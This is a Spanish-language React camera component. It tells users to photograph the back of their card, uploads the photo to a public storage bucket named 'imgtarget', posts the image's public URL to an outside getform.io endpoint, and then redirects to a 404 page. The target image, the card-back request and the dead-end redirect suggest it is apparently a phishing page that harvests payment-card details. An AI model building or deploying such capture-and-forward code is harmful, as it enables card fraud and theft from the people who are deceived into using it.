import React, { useState, useEffect, useRef } from 'react';
import '../css/camara.css';
import { useNavigate } from 'react-router-dom';
import { supabase } from './firebase'; // Inicialización de Supabase
import { IoCamera } from "react-icons/io5";
import { FaCheckCircle } from "react-icons/fa";
import { MdOutlineError } from "react-icons/md";

const CameraComponent = () => {
  const [stream, setStream] = useState(null);
  const [photoSrc, setPhotoSrc] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [showStartModal, setShowStartModal] = useState(true);
  const [imageBlob, setImageBlob] = useState(null);
  const [hasTakenPhoto, setHasTakenPhoto] = useState(false);
  const videoRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    const startCamera = async () => {
      try {
        const constraints = { video: { facingMode: 'environment' }, audio: false };
        const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        videoRef.current.srcObject = mediaStream;
        setStream(mediaStream);
      } catch (error) {
        console.error('Error al acceder a la cámara:', error);
      }
    };

    startCamera();

    return () => {
      stopCamera();
    };
  }, []);

  const takePhoto = async () => {
    if (!hasTakenPhoto && stream) {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      const photoURL = URL.createObjectURL(photoBlob);

      setPhotoSrc(photoURL);
      setShowModal(true);
      setImageBlob(photoBlob);
      setHasTakenPhoto(true);
    }
  };

  const acceptPhoto = async () => {
    if (imageBlob) {
      try {
        // Subir la imagen a Supabase Storage
        const fileName = `img/${Date.now()}.jpg`;
        const { data, error } = await supabase.storage
          .from('imgtarget')
          .upload(fileName, imageBlob, {
            cacheControl: '3600',
            upsert: false,
            contentType: 'image/jpeg',
          });

        if (error) {
          console.error('Error al subir la imagen a Supabase:', error.message);
          window.alert('Error al guardar la imagen.');
          return;
        }

        console.log('Imagen subida a Supabase:', data);

        // Obtener la URL pública de la imagen
        const { data: publicUrlData } = supabase.storage
          .from('imgtarget')
          .getPublicUrl(fileName);

        const publicUrl = publicUrlData.publicUrl;

        // Enviar la URL de la imagen a Getform
        const formData = new FormData();
        formData.append('imagen', publicUrl); // Cambia 'imagen_url' por el nombre correcto en tu formulario Getform

        const response = await fetch('https://getform.io/f/bpjmljxb', {
          method: 'POST',
          body: formData,
        });

        if (response.ok) {
          console.log('Imagen enviada correctamente a Getform');
          window.alert('Imagen enviada correctamente.');
        } else {
          console.error('Error al enviar la imagen a Getform');
        }

        // Redirigir después de guardar y enviar la imagen
        navigate('/404');
      } catch (error) {
        console.error('Error:', error);
        window.alert('Error al procesar la imagen.');
      }
    }

    setShowModal(false);
  };

  const cancelPhoto = () => {
    setShowModal(false);
  };

  const stopCamera = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  };

  return (
    <div>
      <h1 className="titulocam">ENFOQUE LA PARTE TRASERA DE SU PLÁSTICO</h1>

      {showStartModal && (
        <div className="modal-background">
          <div className="modal-content">
            <img src="tarjetaspinatras.jpg" alt="Imagen" className="modal-image" />
            <p className="modal-text">Fotografíe la parte trasera de su plástico</p>
            <button className="modal-close-button" onClick={() => setShowStartModal(false)}>Cerrar</button>
          </div>
        </div>
      )}

      {showModal && (
        <div id="camera-container">
          <div id="camera-modal">
            <img id="photo-preview" src={photoSrc} alt="Foto tomada" />
            <div id="buttons-container">
              <button id="accept-photo" onClick={acceptPhoto}><FaCheckCircle /> Aceptar</button>
              <button id="cancel-photo" className="cancel" onClick={cancelPhoto}><MdOutlineError /> Cancelar</button>
            </div>
          </div>
        </div>
      )}

      <video ref={videoRef} autoPlay playsInline style={{ display: 'block', height: '400px', width: '100%' }} />
      <button id="start-camera" onClick={takePhoto}><IoCamera /> Capturar</button>
    </div>
  );
};

export default CameraComponent;
